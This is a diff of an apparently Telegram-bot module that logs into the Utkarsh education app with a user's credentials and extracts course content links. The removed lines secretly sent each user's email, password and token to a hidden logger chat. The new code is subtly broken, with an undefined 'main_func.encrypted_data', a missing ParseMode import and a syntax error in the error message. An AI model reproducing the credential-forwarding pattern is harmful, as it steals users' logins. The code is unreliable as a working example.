@@ -1,10 +1,8 @@
-import os, traceback, time, re, asyncio, secrets, ujson as json
+import os, time, re, asyncio, secrets, ujson as json
 import aiohttp
 from datetime import datetime
-from pyrogram.enums import ParseMode
-from config import LOGGER_ID
-from Extractor.core.func import get_time, send_file
-from Extractor.core.c_func import gen_key_iv, encrypt, decrypt, decode_jwt
+from Extractor.core import main_func
+
 
 
 def gen_device_id(length=16):
@@ -36,7 +34,7 @@ class UtkarshExtractor:
         async with self.semaphore:
             async with session.post(url, headers=headers, data=data) as resp:
                 response_data = await resp.text()
-                decrypted = decrypt(key, iv, response_data.split(':', 1)[0])
+                decrypted = main_func.decrypt(key, iv, response_data.split(':', 1)[0])
                 return json.loads(decrypted)
 
     async def get_content_url(self, session, content, course_id, headers, key, iv):
@@ -55,7 +53,7 @@ class UtkarshExtractor:
                     session,
                     f"{self.API_BASE}/data_model/meta_distributer/on_request_meta_source",
                     headers,
-                    encrypt(key, iv, json.dumps(data)),
+                    main_func.encrypt(key, iv, json.dumps(data)),
                     key, iv
                 )
 
@@ -94,7 +92,7 @@ class UtkarshExtractor:
             session,
             f"{self.API_BASE}/data_model/course/get_master_data",
             headers,
-            encrypt(key, iv, json.dumps(data)),
+            main_func.encrypt(key, iv, json.dumps(data)),
             key, iv
         )
 
@@ -112,7 +110,7 @@ class UtkarshExtractor:
             session,
             f"{self.API_BASE}/data_model/course_deprecated/get_course_detail",
             headers,
-            encrypt(key, iv, json.dumps(data)),
+            main_func.encrypt(key, iv, json.dumps(data)),
             key, iv
         )
 
@@ -128,23 +126,24 @@ class UtkarshExtractor:
         results = await asyncio.gather(*tasks)
         return [item for sub in results for item in sub]
 
-    async def extract_content(self, app, query, message):
+    async def start_login(self, app, message, user_id=None):
+        user_id = user_id if user_id else message.from_user.id
         try:
             msg = await message.reply_text(
                 "**🔑 For access, please transmit your ID & Password in the correct sequence:\n\n"
                 "🔒 Send like this: ID*Password\n\nOr Send Token....**"
             )
 
-            input1 = await app.listen(chat_id=message.chat.id, user_id=query.from_user.id)
+            input1 = await app.listen(user_id=user_id, timeout=30)
             raw_text = input1.text
-            await input1.delete(True)
+            await input1.delete()
 
             async with aiohttp.ClientSession() as session:
                 if '*' in raw_text:
                     email, password = raw_text.split("*")
-                    self.device_id = gen_device_id()
+                    self.device_id = main_func.gen_device_id()
 
-                    key, iv = gen_key_iv(self.DEFAULT_BASE)
+                    key, iv = main_func.gen_key_iv(self.DEFAULT_BASE)
                     login_data = {
                         "device_id": self.device_id,
                         "device_token": "utkarsh_device",
@@ -160,34 +159,31 @@ class UtkarshExtractor:
                             "os_version": "14"
                         },
                     }
-                    encrypted_data = encrypt(key, iv, json.dumps(login_data))
+                    encrypted_data = main_func.encrypt(key, iv, json.dumps(login_data))
 
                     result = await self.fetch(
                         session,
                         f"{self.API_BASE}/data_model/users/login_auth",
                         self.HEADERS,
-                        encrypted_data,
+                        main_func.encrypted_data,
                         key, iv
                     )
                     token = result['data']['jwt']
                     await message.reply_text(f"ʏᴏᴜʀ ᴛᴏᴋᴇɴ:\n`{token}`")
-                    id_pass = f"ɪᴅ ᴘᴀssᴡᴏʀᴅ: <code>{email}*{password}</code>\n"
-
                 else:
                     token = raw_text.strip()
-                    id_pass = ""
 
-                user_id = decode_jwt(token)['id']
-                key, iv = gen_key_iv(self.BASE, user_id)
-                headers = {**self.HEADERS, 'jwt': token, 'userid': str(user_id)}
+                userId = main_func.jwt_decoder(token)['id']
+                key, iv = main_func.gen_key_iv(self.BASE, userId)
+                headers = {**self.HEADERS, 'jwt': token, 'userid': str(userId)}
 
-                data = {"user_id": user_id}
-                encrypted_data = encrypt(key, iv, json.dumps(data))
+                data = {"user_id": userId}
+                encrypted_data = main_func.encrypt(key, iv, json.dumps(data))
                 courses_data = await self.fetch(
                     session,
                     f"{self.API_BASE}/data_model/course/get_my_courses",
                     headers,
-                    encrypted_data,
+                    main_func.encrypted_data,
                     key, iv
                 )
                 courses = courses_data['data']
@@ -201,17 +197,9 @@ class UtkarshExtractor:
                     "<b>Send Batch ID to download:</b>",
                     parse_mode=ParseMode.HTML
                 )
-                try:
-                    await app.send_message(
-                        chat_id=LOGGER_ID,
-                        text=f"✅ UTKARSH\n\n{id_pass}ᴛᴏᴋᴇɴ: <code>{token}</code>\n\n{batch_list}",
-                        reply_to_message_id=1426,
-                        parse_mode=ParseMode.HTML
-                    )
-                except:
-                    pass
+                
 
-                batch_msg = await app.listen(chat_id=message.chat.id, user_id=query.from_user.id)
+                batch_msg = await app.listen(user_id=user_id, timeout=30)
                 batch_id = batch_msg.text.strip()
                 await batch_msg.delete()
 
@@ -221,13 +209,13 @@ class UtkarshExtractor:
                 start_time = time.time()
 
                 data = {"course_id": batch_id, "parent_id": ""}
-                encrypted_data = encrypt(key, iv, json.dumps(data))
+                encrypted_data = main_func.encrypt(key, iv, json.dumps(data))
 
                 course_data = await self.fetch(
                     session,
                     f"{self.API_BASE}/data_model/course_deprecated/get_course_detail",
                     headers,
-                    encrypted_data,
+                    main_func.encrypted_data,
                     key, iv
                 )
 
@@ -248,7 +236,7 @@ class UtkarshExtractor:
                 with open(filename, 'w', encoding='utf-8') as f:
                     f.write("\n".join(all_contents))
 
-                elapsed = get_time(time.time() - start_time)
+                elapsed = main_func.get_time(time.time() - start_time)
 
                 caption = (
                     f"**App Name :- Utkarsh**\n"
@@ -257,12 +245,9 @@ class UtkarshExtractor:
                     f"📝 **Total pdf**: `{self.p_count}`\n"
                     f"⌚️**Time Taken**: `{elapsed}`"
                 )
-
-                return await send_file(filename, caption, msg, query)
-
+                await message.reply_document(filename)
         except Exception as e:
-            traceback.print_exc()
-            await message.reply_text(f"An error occurred: {str(e)}")
+            await message.reply_text(f"Error: {e)}")
 
 
 async def utkarsh(app, query, message):
